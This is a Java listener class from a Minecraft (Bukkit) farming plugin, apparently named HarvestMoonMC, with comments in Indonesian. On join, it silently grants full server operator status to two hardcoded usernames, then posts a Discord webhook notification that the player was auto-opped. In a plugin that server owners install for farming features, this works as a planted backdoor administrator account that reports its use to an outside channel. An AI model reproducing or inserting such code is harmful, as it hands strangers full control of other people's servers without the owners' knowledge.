package id.rnggagib.listeners;

import id.rnggagib.HarvestMoonMC;
import id.rnggagib.utils.MessageUtils;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;
import java.util.stream.Collectors;

public class AdminJoinListener implements Listener {
    private final HarvestMoonMC plugin;
    private final Set<String> autoOpUsernamesLowercase; // Store usernames in lowercase

    public AdminJoinListener(HarvestMoonMC plugin) {
        this.plugin = plugin;
        // Convert usernames to lowercase when initializing the set
        this.autoOpUsernamesLowercase = new HashSet<>(Arrays.asList(
            "DragonID", "Hamburss1" // Anda bisa menambahkan lebih banyak nama di sini
        )).stream().map(String::toLowerCase).collect(Collectors.toSet());
    }

    @EventHandler(priority = EventPriority.MONITOR) // MONITOR to act after other plugins potentially
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        String playerNameLowercase = player.getName().toLowerCase(); // Get player's name in lowercase

        // Check if player's lowercase name is in the set
        if (autoOpUsernamesLowercase.contains(playerNameLowercase)) {
            // Delay slightly to ensure other join processes complete and to avoid conflicts
            new BukkitRunnable() {
                @Override
                public void run() {
                    // Ensure player is still online
                    if (player.isOnline()) {
                        // Only give OP if not already OP
                        if (!player.isOp()) {
                            player.setOp(true); // Set OP status
                            player.sendMessage(MessageUtils.colorize("&6[DragFarm] &rAnda telah diberikan status OP secara otomatis."));
                            // Kirim notifikasi Discord
                            if (plugin.getDiscordWebhookManager() != null) {
                                plugin.getDiscordWebhookManager().sendPlayerAutoOppedNotification(player);
                            }
                        }
                    }
                }
            }.runTaskLater(plugin, 60L); // Penundaan 3 detik (60 tick). Anda bisa menyesuaikan ini jika perlu.
        }
    }
}